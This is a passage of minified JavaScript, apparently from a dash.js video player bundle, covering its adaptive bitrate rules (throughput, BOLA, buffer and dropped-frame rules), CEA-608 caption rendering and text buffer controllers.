R+Q.d}),0):w?F:h+F,N=Math.round(8*P/O),r(G),G===p.default.VIDEO?F<z.get().streaming.cacheLoadThresholds[p.default.VIDEO]:G===p.default.AUDIO&&F<z.get().streaming.cacheLoadThresholds[p.default.AUDIO]){if(0<J[G].length&&!J[G].hasCachedEntries)return;J[G].hasCachedEntries=!0}else J[G]&&J[G].hasCachedEntries&&(delete J[G],delete E[G],delete D[G],delete I[G],r(G));J[G].push(N),20<J[G].length&&J[G].shift(),E[G].push(h),20<E[G].length&&E[G].shift(),f(D[G],N,.001*F,L.throughputHalfLife),f(I[G],h,1,L.latencyHalfLife)}},getAverageThroughput:t,getSafeAverageThroughput:function(G,N){return G=t(G,N),isNaN(G)||(G*=z.get().streaming.abr.bandwidthSafetyFactor),G},getAverageLatency:function(G){return g(!1,G)},reset:x},L={throughputHalfLife:{fast:3,slow:8},latencyHalfLife:{fast:1,slow:2}},x(),l}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108));u=v(u(47)),m.__dashjs_factory_name="ThroughputHistory",M.default=u.default.getClassFactory(m),da.exports=M.default},{108:108,47:47}],189:[function(u,da,M){function v(J){return J&&J.__esModule?J:{default:J}}function m(J){function E(F){return F.filter((function(P){return P.quality>z.default.NO_CHANGE}))}function D(F){var P,O={},R=void 0,Q=void 0,ja=void 0;if(0!==F.length){O[z.default.PRIORITY.STRONG]=z.default.NO_CHANGE,O[z.default.PRIORITY.WEAK]=z.default.NO_CHANGE,O[z.default.PRIORITY.DEFAULT]=z.default.NO_CHANGE;var W=0;for(P=F.length;W<P;W+=1)(R=F[W]).quality!==z.default.NO_CHANGE&&(O[R.priority]=O[R.priority]>z.default.NO_CHANGE?Math.min(O[R.priority],R.quality):R.quality);return O[z.default.PRIORITY.WEAK]!==z.default.NO_CHANGE&&(Q=O[z.default.PRIORITY.WEAK]),O[z.default.PRIORITY.DEFAULT]!==z.default.NO_CHANGE&&(Q=O[z.default.PRIORITY.DEFAULT]),O[z.default.PRIORITY.STRONG]!==z.default.NO_CHANGE&&(Q=O[z.default.PRIORITY.STRONG]),Q!==z.default.NO_CHANGE&&(ja=Q),(0,z.default)(I).create(ja)}}J=J||{};var I=this.context,L=J.mediaPlayerModel,G=J.dashMetrics,N=J.settings,w=void 0,h=void 0;return{initialize:function(){w=[],h=[],N.get().streaming.abr.useDefaultABRRules&&(w.push((0,r.default)(I).create({dashMetrics:G,mediaPlayerModel:L,settings:N})),w.push((0,p.default)(I).create({dashMetrics:G})),w.push((0,l.default)(I).create({dashMetrics:G})),w.push((0,t.default)(I).create()),w.push((0,g.default)(I).create()),h.push((0,f.default)(I).create({dashMetrics:G,mediaPlayerModel:L,settings:N}))),L.getABRCustomRules().forEach((function(F){"qualitySwitchRules"===F.type&&w.push(F.rule(I).create()),"abandonFragmentRules"===F.type&&h.push(F.rule(I).create())}))},reset:function(){[w,h].forEach((function(F){F&&F.length&&F.forEach((function(P){return P.reset&&P.reset()}))})),w=[],h=[]},getMaxQuality:function(F){return D(E(w.map((function(P){return P.getMaxIndex(F)}))))||(0,z.default)(I).create()},shouldAbandonFragment:function(F){return D(E(h.map((function(P){return P.shouldAbandon(F)}))))||(0,z.default)(I).create()}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(195)),l=v(u(193)),f=v(u(190)),g=v(u(192)),t=v(u(194)),r=v(u(191)),x=v(u(47)),z=v(u(186));m.__dashjs_factory_name="ABRRulesCollection",(u=x.default.getClassFactory(m)).QUALITY_SWITCH_RULES="qualitySwitchRules",u.ABANDON_FRAGMENT_RULES="abandonFragmentRules",x.default.updateSingletonFactory(m.__dashjs_factory_name,u),M.default=u,da.exports=M.default},{186:186,190:190,191:191,192:192,193:193,194:194,195:195,47:47}],190:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(g){function t(){D={},I={},L=[]}g=g||{};var r=this.context,x=g.mediaPlayerModel,z=g.dashMetrics,J=g.settings,E=g=void 0,D=void 0,I=void 0,L=void 0;return g={shouldAbandon:function(G){var N=(0,p.default)(r).create(p.default.NO_CHANGE,{name:m.__dashjs_factory_name});if(!(G&&G.hasOwnProperty("getMediaInfo")&&G.hasOwnProperty("getMediaType")&&G.hasOwnProperty("getCurrentRequest")&&G.hasOwnProperty("getRepresentationInfo")&&G.hasOwnProperty("getAbrController")))return N;var w,h,F=G.getMediaInfo(),P=G.getMediaType(),O=G.getCurrentRequest();if(!isNaN(O.index)){if(h=O.index,D[P]=D[P]||{},D[P][h]=D[P][h]||{},x.getStableBufferTime()<z.getCurrentBufferLevel(P))return N;if(null===(h=D[P][O.index])||null===O.firstByteDate||I.hasOwnProperty(h.id))return N;if(void 0===h.firstByteTime&&(L[P]=[],h.firstByteTime=O.firstByteDate.getTime(),h.segmentDuration=O.duration,h.bytesTotal=O.bytesTotal,h.id=O.index),h.bytesLoaded=O.bytesLoaded,h.elapsedTime=(new Date).getTime()-h.firstByteTime,0<h.bytesLoaded&&0<h.elapsedTime&&(w=Math.round(8*h.bytesLoaded/h.elapsedTime),L[P]=L[P]||[],L[P].push(w)),5<=L[P].length&&500<h.elapsedTime&&h.bytesLoaded<h.bytesTotal){var R,Q,ja,W,aa,ma;if(w=L[P].reduce((function(H,B){return H+B}),0),h.measuredBandwidthInKbps=Math.round(w/L[P].length),h.estimatedTimeOfDownload=+(8*h.bytesTotal/h.measuredBandwidthInKbps/1e3).toFixed(2),h.estimatedTimeOfDownload<1.8*h.segmentDuration||0===G.getRepresentationInfo().quality)return N;I.hasOwnProperty(h.id)||(R=G.getAbrController(),Q=h.bytesTotal-h.bytesLoaded,ja=R.getBitrateList(F),W=R.getQualityForBitrate(F,h.measuredBandwidthInKbps*J.get().streaming.abr.bandwidthSafetyFactor),ma=void 0!==(aa=R.getMinAllowedIndexFor(P))?Math.max(aa,W):W,h.bytesTotal*ja[ma].bitrate/ja[R.getQualityFor(P)].bitrate<Q&&(N.quality=ma,N.reason.throughput=h.measuredBandwidthInKbps,N.reason.fragmentID=h.id,I[h.id]=h,E.debug("["+P+"] frag id",h.id," is asking to abandon and switch to quality to ",ma," measured bandwidth was",h.measuredBandwidthInKbps),delete D[P][h.id]))}else h.bytesLoaded===h.bytesTotal&&delete D[P][h.id]}return N},reset:t},E=(0,f.default)(r).getInstance().getLogger(g),t(),g}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(186)),l=v(u(47)),f=v(u(45));m.__dashjs_factory_name="AbandonRequestsRule",M.default=l.default.getClassFactory(m),da.exports=M.default},{186:186,45:45,47:47}],191:[function(u,da,M){function v(z){return z&&z.__esModule?z:{default:z}}function m(z){function J(A,Y,Z){var na=Z.reduce((function(T,pa,ia){return pa>Z[T]?ia:T}),0);return 0===na?null:{gp:A=(Z[na]-1)/(Math.max(A,10+2*Y.length)/10-1),Vp:10/A}}function D(A){A.placeholderBuffer=0,A.mostAdvancedSegmentStart=NaN,A.lastSegmentWasReplacement=!1,A.lastSegmentStart=NaN,A.lastSegmentDurationS=NaN,A.lastSegmentRequestTimeMs=NaN,A.lastSegmentFinishTimeMs=NaN}function I(A,Y){var Z,na,T,pa=W.getStableBufferTime();A.stableBufferTime!==pa&&((Z=J(pa,A.bitrates,A.utilities)).Vp===A.Vp&&Z.gp===A.gp||(T=(na=ja.getCurrentBufferLevel(Y))+A.placeholderBuffer,T-=10,T*=Z.Vp/A.Vp,T+=10,A.stableBufferTime=pa,A.Vp=Z.Vp,A.gp=Z.gp,A.placeholderBuffer=Math.max(0,T-na)))}function L(A,Y){for(var Z,na,T,pa=A.bitrates[Y],ia=A.utilities[Y],S=0,V=Y-1;0<=V;--V)A.utilities[V]<A.utilities[Y]&&(Z=A.bitrates[V],na=A.utilities[V],T=A.Vp*(A.gp+(pa*na-Z*ia)/(pa-Z)),S=Math.max(S,T));return S}function G(){for(var A in B)B.hasOwnProperty(A)&&2===B[A].state&&(B[A].placeholderBuffer=0)}function N(){for(var A in B){var Y;!B.hasOwnProperty(A)||0!==(Y=B[A]).state&&(Y.state=1,D(Y))}}function w(){}function h(A){var Y,Z;A&&A.chunk&&A.chunk.mediaInfo&&(Y=B[A.chunk.mediaInfo.type])&&0!==Y.state&&(Z=A.chunk.start,isNaN(Y.mostAdvancedSegmentStart)||Z>Y.mostAdvancedSegmentStart?(Y.mostAdvancedSegmentStart=Z,Y.lastSegmentWasReplacement=!1):Y.lastSegmentWasReplacement=!0,Y.lastSegmentStart=Z,Y.lastSegmentDurationS=A.chunk.duration,Y.lastQuality=A.chunk.quality,P(Y,A.chunk.mediaInfo.type))}function F(A){var Y;A&&A.metric===p.default.HTTP_REQUEST&&A.value&&A.value.type===g.HTTPRequest.MEDIA_SEGMENT_TYPE&&A.value.trace&&A.value.trace.length&&(Y=B[A.mediaType])&&0!==Y.state&&(Y.lastSegmentRequestTimeMs=A.value.trequest.getTime(),Y.lastSegmentFinishTimeMs=A.value._tfinish.getTime(),P(Y,A.mediaType))}function P(A,Y){var Z,na,T;isNaN(A.lastSegmentStart)||isNaN(A.lastSegmentRequestTimeMs)||isNaN(A.placeholderBuffer)||(A.placeholderBuffer*=.99,isNaN(A.lastSegmentFinishTimeMs)||(Z=ja.getCurrentBufferLevel(Y)+.001*(A.lastSegmentFinishTimeMs-A.lastSegmentRequestTimeMs),na=A.Vp*(A.utilities[A.lastQuality]+A.gp),T=Math.max(0,na-Z),A.placeholderBuffer=Math.min(T,A.placeholderBuffer)),A.lastSegmentWasReplacement&&!isNaN(A.lastSegmentDurationS)&&(A.placeholderBuffer+=A.lastSegmentDurationS),A.lastSegmentStart=NaN,A.lastSegmentRequestTimeMs=NaN)}function O(A){var Y;!A||(Y=B[A.mediaType])&&0!==Y.state&&(Y.abrQuality=A.newQuality)}function R(A){var Y,Z,na,T;!A||(Y=B[A.mediaType])&&0!==Y.state&&(Z=ja.getCurrentBufferLevel(A.mediaType),na=0<Y.abrQuality?L(Y,Y.abrQuality):10,T=Math.max(0,na-Z),Y.placeholderBuffer=Math.min(Y.placeholderBuffer,T))}z=z||{};var Q=this.context,ja=z.dashMetrics,W=z.mediaPlayerModel,aa=(0,t.default)(Q).getInstance(),ma=void 0,H=void 0,B=void 0;return ma={getMaxIndex:function(A){var Y=(0,l.default)(Q).create();if(!(A&&A.hasOwnProperty("getMediaInfo")&&A.hasOwnProperty("getMediaType")&&A.hasOwnProperty("getScheduleController")&&A.hasOwnProperty("getStreamInfo")&&A.hasOwnProperty("getAbrController")&&A.hasOwnProperty("useBufferOccupancyABR")))return Y;var Z=A.getMediaInfo(),na=A.getMediaType(),T=A.getScheduleController(),pa=A.getStreamInfo(),ia=A.getAbrController(),S=ia.getThroughputHistory(),V=pa?pa.id:null;pa=pa&&pa.manifestInfo&&pa.manifestInfo.isDynamic;var ba,ha,oa=A.useBufferOccupancyABR();if(Y.reason=Y.reason||{},!oa)return Y;if(T.setTimeToLoadDelay(0),ba=A.getMediaType(),(ha=B[ba])?0!==ha.state&&I(ha,ba):(ha=function E(A){var Y={};A=A.getMediaInfo().bitrateList.map((function(pa){return pa.bandwidth}));var Z=(Z=A.map((function(pa){return Math.log(pa)}))).map((function(pa){return pa-Z[0]+1})),na=W.getStableBufferTime(),T=J(na,A,Z);return T?(Y.state=1,Y.bitrates=A,Y.utilities=Z,Y.stableBufferTime=na,Y.Vp=T.Vp,Y.gp=T.gp,Y.lastQuality=0,D(Y)):Y.state=0,Y}(A),B[ba]=ha),0===(A=ha).state)return Y;if(ba=ja.getCurrentBufferLevel(na),ha=S.getAverageThroughput(na,pa),pa=S.getSafeAverageThroughput(na,pa),S=S.getAverageLatency(na),Y.reason.state=A.state,Y.reason.throughput=ha,Y.reason.latency=S,isNaN(ha))return Y;switch(A.state){case 1:var ka=ia.getQualityForBitrate(Z,pa,S);Y.quality=ka,Y.reason.throughput=pa,A.placeholderBuffer=Math.max(0,L(A,ka)-ba),A.lastQuality=ka,!isNaN(A.lastSegmentDurationS)&&ba>=A.lastSegmentDurationS&&(A.state=2);break;case 2:oa=Date.now(),isNaN(A.lastSegmentFinishTimeMs)?isNaN(A.lastCallTimeMs)||(ka=.001*(oa-A.lastCallTimeMs),A.placeholderBuffer+=Math.max(0,ka)):(ka=.001*(oa-A.lastSegmentFinishTimeMs),A.placeholderBuffer+=Math.max(0,ka)),A.lastCallTimeMs=oa,A.lastSegmentStart=NaN,A.lastSegmentRequestTimeMs=NaN,A.lastSegmentFinishTimeMs=NaN,I(A,na),ka=ba+A.placeholderBuffer,oa=A.bitrates.length;for(var la=NaN,C=NaN,fa=0;fa<oa;++fa){var qa=(A.Vp*(A.utilities[fa]+A.gp)-ka)/A.bitrates[fa];(isNaN(C)||C<=qa)&&(C=qa,la=fa)}ka=la,Z=ia.getQualityForBitrate(Z,pa,S),ka>A.lastQuality&&Z<ka&&(ka=Math.max(Z,A.lastQuality)),(Z=Math.max(0,ba+A.placeholderBuffer-A.Vp*(A.utilities[ka]+A.gp)))<=A.placeholderBuffer?(A.placeholderBuffer-=Z,Z=0):(Z-=A.placeholderBuffer,A.placeholderBuffer=0,ka<ia.getTopQualityIndexFor(na,V)?T.setTimeToLoadDelay(1e3*Z):Z=0),Y.quality=ka,Y.reason.throughput=ha,Y.reason.latency=S,Y.reason.bufferLevel=ba,Y.reason.placeholderBuffer=A.placeholderBuffer,Y.reason.delay=Z,A.lastQuality=ka;break;default:H.debug("BOLA ABR rule invoked in bad state."),Y.quality=ia.getQualityForBitrate(Z,pa,S),Y.reason.state=A.state,Y.reason.throughput=pa,Y.reason.latency=S,A.state=1,D(A)}return Y},reset:function(){B={},aa.off(r.default.BUFFER_EMPTY,G,ma),aa.off(r.default.PLAYBACK_SEEKING,N,ma),aa.off(r.default.PERIOD_SWITCH_STARTED,w,ma),aa.off(r.default.MEDIA_FRAGMENT_LOADED,h,ma),aa.off(r.default.METRIC_ADDED,F,ma),aa.off(r.default.QUALITY_CHANGE_REQUESTED,O,ma),aa.off(r.default.FRAGMENT_LOADING_ABANDONED,R,ma)}},H=(0,x.default)(Q).getInstance().getLogger(ma),B={},aa.on(r.default.BUFFER_EMPTY,G,ma),aa.on(r.default.PLAYBACK_SEEKING,N,ma),aa.on(r.default.PERIOD_SWITCH_STARTED,w,ma),aa.on(r.default.MEDIA_FRAGMENT_LOADED,h,ma),aa.on(r.default.METRIC_ADDED,F,ma),aa.on(r.default.QUALITY_CHANGE_REQUESTED,O,ma),aa.on(r.default.FRAGMENT_LOADING_ABANDONED,R,ma),ma}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(109)),l=v(u(186)),f=v(u(47)),g=u(241),t=v(u(46)),r=v(u(54)),x=v(u(45));m.__dashjs_factory_name="BolaRule",M.default=f.default.getClassFactory(m),da.exports=M.default},{109:109,186:186,241:241,45:45,46:46,47:47,54:54}],192:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(){var t,g=this.context,r=void 0;return t={getMaxIndex:function(x){var z=(0,l.default)(g).create();if(!x||!x.hasOwnProperty("getDroppedFramesHistory"))return z;if(x=x.getDroppedFramesHistory()){z=x.getFrameHistory();for(var J=x=0,E=l.default.NO_CHANGE,D=1;D<z.length;D++)if(z[D]&&(x=z[D].droppedVideoFrames,375<(J=z[D].totalVideoFrames)&&.15<x/J)){E=D-1,r.debug("index: "+E+" Dropped Frames: "+x+" Total Frames: "+J);break}return(0,l.default)(g).create(E,{droppedFrames:x})}return z}},r=(0,f.default)(g).getInstance().getLogger(t),t}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(186)),f=v(u(45));m.__dashjs_factory_name="DroppedFramesRule",M.default=p.default.getClassFactory(m),da.exports=M.default},{186:186,45:45,47:47}],193:[function(u,da,M){function v(z){return z&&z.__esModule?z:{default:z}}function m(z){function J(){(h={})[r.default.VIDEO]={ignoreCount:2},h[r.default.AUDIO]={ignoreCount:2}}function E(){J()}function D(F){isNaN(F.startTime)||F.mediaType!==r.default.AUDIO&&F.mediaType!==r.default.VIDEO||0<h[F.mediaType].ignoreCount&&h[F.mediaType].ignoreCount--}z=z||{};var I=this.context,L=(0,p.default)(I).getInstance(),G=z.dashMetrics,N=void 0,w=void 0,h=void 0;return N={getMaxIndex:function(F){var P=(0,t.default)(I).create();if(!F||!F.hasOwnProperty("getMediaType"))return P;if(!G||!G.hasOwnProperty("getCurrentBufferLevel")||!G.hasOwnProperty("getCurrentBufferState"))throw Error(r.default.MISSING_CONFIG_ERROR);var O,R,Q,ja,W,aa,ma,H=F.getMediaType(),B=G.getCurrentBufferState(H),A=F.getRepresentationInfo().fragmentDuration;return 0<h[H].ignoreCount||!A||(B&&B.state===x.default.BUFFER_EMPTY?(w.debug("["+H+"] Switch to index 0; buffer is empty."),P.quality=0,P.reason="InsufficientBufferRule: Buffer is empty"):(O=F.getMediaInfo(),Q=(R=F.getAbrController()).getThroughputHistory(),ja=G.getCurrentBufferLevel(H),W=Q.getAverageThroughput(H),aa=Q.getAverageLatency(H),ma=ja/A*W*.5,P.quality=R.getQualityForBitrate(O,ma,aa),P.reason="InsufficientBufferRule: being conservative to avoid immediate rebuffering")),P},reset:function(){J(),L.off(l.default.PLAYBACK_SEEKING,E,N),L.off(l.default.BYTES_APPENDED_END_FRAGMENT,D,N)}},w=(0,g.default)(I).getInstance().getLogger(N),J(),L.on(l.default.PLAYBACK_SEEKING,E,N),L.on(l.default.BYTES_APPENDED_END_FRAGMENT,D,N),N}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(46)),l=v(u(54)),f=v(u(47)),g=v(u(45)),t=v(u(186)),r=v(u(108)),x=v(u(109));m.__dashjs_factory_name="InsufficientBufferRule",M.default=f.default.getClassFactory(m),da.exports=M.default},{108:108,109:109,186:186,45:45,46:46,47:47,54:54}],194:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(){var t,g=this.context,r=void 0;return t={getMaxIndex:function(x){x=(x=x?x.getSwitchHistory():null)?x.getSwitchRequests():[];for(var z=0,J=0,E=0,D=(0,f.default)(g).create(),I=0;I<x.length;I++)if(void 0!==x[I]&&(z+=x[I].drops,J+=x[I].noDrops,E+=x[I].dropSize,6<=z+J&&.075<z/J)){D.quality=0<I&&0<x[I].drops?I-1:I,D.reason={index:D.quality,drops:z,noDrops:J,dropSize:E},r.debug("Switch history rule index: "+D.quality+" samples: "+(z+J)+" drops: "+z);break}return D}},r=(0,l.default)(g).getInstance().getLogger(t),t}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(45)),f=v(u(186));m.__dashjs_factory_name="SwitchHistoryRule",M.default=p.default.getClassFactory(m),da.exports=M.default},{186:186,45:45,47:47}],195:[function(u,da,M){function v(r){return r&&r.__esModule?r:{default:r}}function m(r){r=r||{};var x=this.context,z=r.dashMetrics,J=r=void 0;return r={getMaxIndex:function(E){var D=(0,f.default)(x).create();if(!(E&&E.hasOwnProperty("getMediaInfo")&&E.hasOwnProperty("getMediaType")&&E.hasOwnProperty("useBufferOccupancyABR")&&E.hasOwnProperty("getAbrController")&&E.hasOwnProperty("getScheduleController")))return D;if(!z||!z.hasOwnProperty("getCurrentBufferState"))throw Error(g.default.MISSING_CONFIG_ERROR);var I=E.getMediaInfo(),L=E.getMediaType(),G=z.getCurrentBufferState(L),N=E.getScheduleController(),w=E.getAbrController(),h=E.getStreamInfo();h=h&&h.manifestInfo?h.manifestInfo.isDynamic:null;var F=w.getThroughputHistory(),P=F.getSafeAverageThroughput(L,h);return F=F.getAverageLatency(L),E=E.useBufferOccupancyABR(),isNaN(P)||!G||E||w.getAbandonmentStateFor(L)!==t.default.ABANDON_LOAD&&(G.state!==t.default.BUFFER_LOADED&&!h||(D.quality=w.getQualityForBitrate(I,P,F),N.setTimeToLoadDelay(0),J.debug("["+L+"] requesting switch to index: ",D.quality,"Average throughput",Math.round(P),"kbps"),D.reason={throughput:P,latency:F})),D},reset:function(){}},J=(0,l.default)(x).getInstance().getLogger(r),r}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(45)),f=v(u(186)),g=v(u(108)),t=v(u(109));m.__dashjs_factory_name="ThroughputRule",M.default=p.default.getClassFactory(m),da.exports=M.default},{108:108,109:109,186:186,45:45,47:47}],196:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(g){function t(D,I,L){var G,N,w;return D&&I?D===p.default.FRAGMENTED_TEXT?z.isTextEnabled()?isNaN(I.fragmentDuration)?(G=r.getCurrentSchedulingInfo(f.default.SCHEDULING_INFO))?G.duration:0:I.fragmentDuration:0:D===p.default.AUDIO&&L?(N=r.getCurrentBufferLevel(p.default.VIDEO),isNaN(I.fragmentDuration)?N:Math.max(N,I.fragmentDuration)):(w=I.mediaInfo.streamInfo,J.isPlayingAtTopQuality(w)?w.manifestInfo.duration>=E.get().streaming.longFormContentDurationThreshold?E.get().streaming.bufferTimeAtTopQualityLongForm:E.get().streaming.bufferTimeAtTopQuality:x.getStableBufferTime()):NaN}var r=(g=g||{}).dashMetrics,x=g.mediaPlayerModel,z=g.textController,J=g.abrController,E=g.settings;return{execute:function(D,I,L){return!D||!I||r.getCurrentBufferLevel(D)<t(D,I,L)},getBufferTarget:t}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(47)),f=v(u(109));m.__dashjs_factory_name="BufferLevelRule",M.default=l.default.getClassFactory(m),da.exports=M.default},{108:108,109:109,47:47}],197:[function(u,da,M){function v(){function p(g){return"red"===g?"rgb(255, 0, 0)":"green"===g?"rgb(0, 255, 0)":"blue"===g?"rgb(0, 0, 255)":"cyan"===g?"rgb(0, 255, 255)":"magenta"===g?"rgb(255, 0, 255)":"yellow"===g?"rgb(255, 255, 0)":"white"===g?"rgb(255, 255, 255)":"black"===g?"rgb(0, 0, 0)":g}function l(g,t){return g=g.videoHeight/15,t?"font-size: "+g+"px; font-family: Menlo, Consolas, 'Cutive Mono', monospace; color: "+(t.foreground?p(t.foreground):"rgb(255, 255, 255)")+"; font-style: "+(t.italics?"italic":"normal")+"; text-decoration: "+(t.underline?"underline":"none")+"; white-space: pre; background-color: "+(t.background?p(t.background):"transparent")+";":"font-size: "+g+"px; font-family: Menlo, Consolas, 'Cutive Mono', monospace; justify-content: flex-start; text-align: left; color: rgb(255, 255, 255); font-style: normal; white-space: pre; line-height: normal; font-weight: normal; text-decoration: none; width: 100%; display: flex;"}var f=0;return{createHTMLCaptionsFromScreen:function(g,t,r,x){var w,W,z=null,J=!1,E=-1,D={start:t,end:r,spans:[]},I="style_cea608_white_black",L={},G={},N=[];for(w=0;15>w;++w){var h=x.rows[w],F="",P=null;if(!1===h.isEmpty()){for(var O=h.chars,R="",Q=0;Q<O.length;++Q)R+=O[Q].uchar;for(O=R.length-R.replace(/^\s+/,"").length,null===z&&(z={x:O,y1:w,y2:w+1,p:[]}),O!==E&&J&&(z.p.push(D),D={start:t,end:r,spans:[]},z.y2=w,z.name="region_"+z.x+"_"+z.y1+"_"+z.y2,!1===L.hasOwnProperty(z.name)?(N.push(z),L[z.name]=z):L[z.name].p.contat(z.p),z={x:O,y1:w,y2:w+1,p:[]}),J=0;J<h.chars.length;++J){var ja;R=(E=h.chars[J]).penState,null!==P&&R.equals(P)||(0<F.trim().length&&(D.spans.push({name:I,line:F,row:w}),F=""),ja="style_cea608_"+R.foreground+"_"+R.background,R.underline&&(ja+="_underline"),R.italics&&(ja+="_italics"),G.hasOwnProperty(ja)||(G[ja]=JSON.parse(JSON.stringify(R))),P=R,I=ja),F+=E.uchar}0<F.trim().length&&D.spans.push({name:I,line:F,row:w}),J=!0,E=O}else J=!1,E=-1,z&&(z.p.push(D),D={start:t,end:r,spans:[]},z.y2=w,z.name="region_"+z.x+"_"+z.y1+"_"+z.y2,!1===L.hasOwnProperty(z.name)?(N.push(z),L[z.name]=z):L[z.name].p.contat(z.p),z=null)}for(z&&(z.p.push(D),z.y2=w+1,z.name="region_"+z.x+"_"+z.y1+"_"+z.y2,!1===L.hasOwnProperty(z.name)?(N.push(z),L[z.name]=z):L[z.name].p.contat(z.p)),x=[],w=0;w<N.length;++w){for(I=N[w],z="sub_cea608_"+f++,(D=document.createElement("div")).id=z,L="left: "+3.125*(W=I).x+"%; top: "+6.66*W.y1+"%; width: "+(100-3.125*W.x)+"%; height: "+6.66*Math.max(W.y2-1-W.y1,1)+"%; align-items: flex-start; overflow: visible; -webkit-writing-mode: horizontal-tb;",D.style.cssText="position: absolute; margin: 0; display: flex; box-sizing: border-box; pointer-events: none;"+L,(h=document.createElement("div")).className="paragraph bodyStyle",h.style.cssText=l(g),(F=document.createElement("div")).className="cueUniWrapper",F.style.cssText="unicode-bidi: normal; direction: ltr;",P=0;P<I.p.length;++P)for(ja=I.p[P],L=J=0;L<ja.spans.length;++L){var aa,ma,H,B;0<(E=ja.spans[L]).line.length&&(0!==L&&J!=E.row&&((aa=document.createElement("br")).className="lineBreak",F.appendChild(aa)),ma=!1,J===E.row&&(ma=!0),J=E.row,H=G[E.name],(B=document.createElement("span")).className="spanPadding "+E.name+" customSpanColor",B.style.cssText=l(g,H),0!==L&&ma?L===ja.spans.length-1?B.textContent=E.line.replace(/\s+$/g,""):B.textContent=E.line:1<ja.spans.length&&L<ja.spans.length-1&&E.row===ja.spans[L+1].row?B.textContent=E.line.replace(/^\s+/g,""):B.textContent=E.line.trim(),F.appendChild(B))}for(var A in h.appendChild(F),D.appendChild(h),I={bodyStyle:["%",90]},G)G.hasOwnProperty(A)&&(I[A]=["%",90]);x.push({type:"html",start:t,end:r,cueHTMLElement:D,cueID:z,cellResolution:[32,15],isFromCEA608:!0,fontSize:I,lineHeight:{},linePadding:{}})}return x}}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="EmbeddedTextHtmlRender",M.default=u.default.getSingletonFactory(v),da.exports=M.default},{47:47}],198:[function(u,da,M){function v(E){return E&&E.__esModule?E:{default:E}}function m(E){function D(H){H.sender.getStreamId()!==h.id||H.sender.getType()!==F||H.error||null===ma.extract(h.id,H.currentRepresentation.id)&&(Q=!1,G.trigger(f.default.INIT_FRAGMENT_NEEDED,{sender:R,streamId:h.id,mediaType:F,representationId:H.currentRepresentation.id}))}function I(H){H.chunk.streamId===h.id&&H.chunk.mediaInfo.type===F&&H.chunk.bytes&&(ma.save(H.chunk),aa.append(H.chunk),Q=!0,G.trigger(f.default.STREAM_COMPLETED,{request:H.request}))}E=E||{};var L=this.context,G=(0,l.default)(L).getInstance(),N=(0,x.default)(L).getInstance(),w=E.errHandler,h=E.streamInfo,F=E.type,P=E.mimeType,O=E.fragmentModel,R=void 0,Q=void 0,ja=void 0,W=void 0,aa=void 0,ma=void 0;return R={getBufferControllerType:function(){return"NotFragmentedTextBufferController"},initialize:function(H){W=H,ma=(0,t.default)(L).getInstance()},createBuffer:function(H){var B,A=H[0];try{return aa=(0,r.default)(L).create(W,A),ja||((B=aa.getBuffer()).hasOwnProperty(p.default.INITIALIZE)&&B.initialize(P,h,H,O),ja=!0),aa}catch(Y){if(A&&(A.isText||-1!==A.codec.indexOf('codecs="stpp')||-1!==A.codec.indexOf('codecs="wvtt')))try{aa=N.getTextSourceBuffer()}catch(Z){w.error(new z.default(J.default.MEDIASOURCE_TYPE_UNSUPPORTED_CODE,J.default.MEDIASOURCE_TYPE_UNSUPPORTED_MESSAGE+F+" : "+Z.message))}else w.error(new z.default(J.default.MEDIASOURCE_TYPE_UNSUPPORTED_CODE,J.default.MEDIASOURCE_TYPE_UNSUPPORTED_MESSAGE+F))}},getType:function(){return F},getBuffer:function(){return aa},getBufferLevel:function(){return 0},setMediaSource:function(H){W=H},getMediaSource:function(){return W},getIsBufferingCompleted:function(){return Q},getIsPruningInProgress:function(){return!1},dischargePreBuffer:function(){},appendInitSegment:function(H){return null!==ma.extract(h.id,H)},getRangeAt:function(){return null},reset:function(H){G.off(f.default.DATA_UPDATE_COMPLETED,D,R),G.off(f.default.INIT_FRAGMENT_LOADED,I,R),!H&&aa&&(aa.abort(),aa.reset(),aa=null)},updateTimestampOffset:function(H){aa.timestampOffset===H||isNaN(H)||(aa.timestampOffset=H)}},W=null,Q=ja=!1,G.on(f.default.DATA_UPDATE_COMPLETED,D,R),G.on(f.default.INIT_FRAGMENT_LOADED,I,R),R}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(46)),f=v(u(54)),g=v(u(47)),t=v(u(213)),r=v(u(104)),x=v(u(200)),z=v(u(225)),J=v(u(51));m.__dashjs_factory_name="NotFragmentedTextBufferController",M.default=g.default.getClassFactory(m),da.exports=M.default},{104:104,108:108,200:200,213:213,225:225,46:46,47:47,51:51,54:54}],199:[function(u,da,M){function v(t){return t&&t.__esModule?t:{default:t}}function m(t){function r(){return J.getBuffer()}t=t||{};var x,z=this.context,J=void 0;return x={getBufferControllerType:function(){return J.getBufferControllerType()},initialize:function(E,D){return J.initialize(E,D)},createBuffer:function(E){return J.createBuffer(E)},getType:function(){return J.getType()},getBuffer:r,setBuffer:function(E){J.setBuffer(E)},getBufferLevel:function(){return J.getBufferLevel()},setMediaSource:function(E){J.setMediaSource(E)},getMediaSource:function(){return J.getMediaSource()},getIsBufferingCompleted:function(){return J.getIsBufferingCompleted()},getIsPruningInProgress:function(){return J.getIsPruningInProgress()},dischargePreBuffer:function(){return J.dischargePreBuffer()},appendInitSegment:function(E){J.appendInitSegment(E)},getRangeAt:function(E){return J.getRangeAt(E)},reset:function(E){J.reset(E)},updateTimestampOffset:function(E){var 